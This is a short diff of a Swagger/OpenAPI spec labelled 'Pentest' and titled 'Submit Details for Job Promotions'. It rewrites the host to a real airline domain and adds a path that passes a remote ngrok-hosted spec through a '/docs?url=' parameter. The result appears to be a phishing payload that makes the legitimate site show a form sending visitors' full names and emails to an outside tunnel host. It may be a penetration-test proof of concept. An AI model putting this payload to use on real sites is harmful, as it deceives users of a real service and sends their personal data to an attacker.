@@ -5,13 +5,13 @@
       "description": "Submit Details for Job Promotions",
       "version": "Pentest"
     },
-    "host": "83d6-183-171-17-204.ngrok.io",
+    "host": "life.airasia.com",
     "basePath": "/",
     "schemes": [
       "http"
     ],
     "paths": {
-      "/submit/{Full Name}&{Email}": {
+      "/docs?url=https://83d6-183-171-17-204.ngrok.io/submit/{Full Name}&{Email}": {
         "get": {
           "description": "Submit Personal Details",
           "operationId": "xyz",
